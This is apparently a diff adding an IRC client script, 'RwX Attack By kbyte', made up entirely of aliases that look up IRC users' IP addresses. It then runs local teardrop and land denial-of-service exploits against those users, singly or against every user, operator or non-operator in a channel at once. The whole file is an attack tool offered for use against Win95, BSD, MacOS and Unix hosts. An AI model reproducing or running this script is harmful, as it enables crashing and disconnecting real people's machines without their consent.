@@ -1,0 +1,66 @@
+^echo RwX Attack By kbyte loaded
+^echo Type /rwxhelp to see the help
+alias rwxhelp {
+    ^echo RwX Attack By kbyte
+    ^echo /tear Nick - teardrop a Nick (Win95 - *NIX - MacOs)
+    ^echo /land Nick - Land a Nick (Win95 - BSD - MacOs)
+    ^echo /mtear all/-o/+o
+    ^echo /mland all/-o/+o
+    ^echo /fuckall all/-o/+o - Uses land and Teardrop
+}
+alias mland if ([$0]) {
+  if ([$0]==[+o]) {
+    echo mass land: all ops on ${C}
+    fe ($chops($C)) nick { land $nick }}
+if ([$0]==[-o]) {
+    echo mass land: all nonops on  ${C}    
+    fe ($nochops($C)) nick { land $nick }}
+  if ([$0]==[all]) {
+    echo mass land : All user on ${C}
+    fe ($chanusers($C)) nick { land $nick }
+}
+}{echo /mland <all/+o/-o>}
+
+alias mtear if ([$0]) {
+  if ([$0]==[+o]) {
+    echo mass tear: all ops on ${C}
+    fe ($chops($C)) nick { tear $nick }}
+  if ([$0]==[-o]) {
+    echo mass tear: all nonops on  ${C}
+fe ($nochops($C)) nick { tear $nick }}
+  if ([$0]==[all]) {
+    fe ($chanusers($C)) nick { tear $nick }
+    echo mass tear : All user on ${C}
+}
+}{echo /mtear <all/+o/-o>}
+
+alias land if ([$0]) {
+  userhost $0 -cmd if ([$3]&&[$4]!=[<UNKNOWN>]) {
+    @nick1=[$0]
+     exec /root/land $nametoip($4) 113 1>/dev/null 2>/dev/null
+    ^echo Landed ${nick1}[ $4 ]   
+     @nick1=[];@_src=[]
+  }
+}{echo Usage : /land nick}
+alias tear if ([$0]) {
+  userhost $0 -cmd if ([$3]&&[$4]!=[<UNKNOWN>]) {
+    @nick1=[$0]
+     exec /root/teardrop 127.0.0.1 $nametoip($4) 1>/dev/null 2>/dev/null
+    ^echo TearDropped  ${nick1}[ $4 ]
+     @nick1=[];@_src=[]
+  }
+}{echo Usage : /tear nick}
+
+alias fuckall if ([$0]) {
+  if ([$0]==[+o]) {
+    echo mass land/tear: all ops on ${C}
+    fe ($chops($C)) nick { land $nick }{ tear $nick}}
+if ([$0]==[-o]) {
+    echo mass land/tear: all nonops on  ${C}
+    fe ($nochops($C)) nick { land $nick }{ tear $nick}}
+  if ([$0]==[all]) {
+    echo mass land/tear : All user on ${C}
+    fe ($chanusers($C)) nick { land $nick }{ tear nick }
+}
+}{echo Usage : /fuckall All/+o/-o}
+
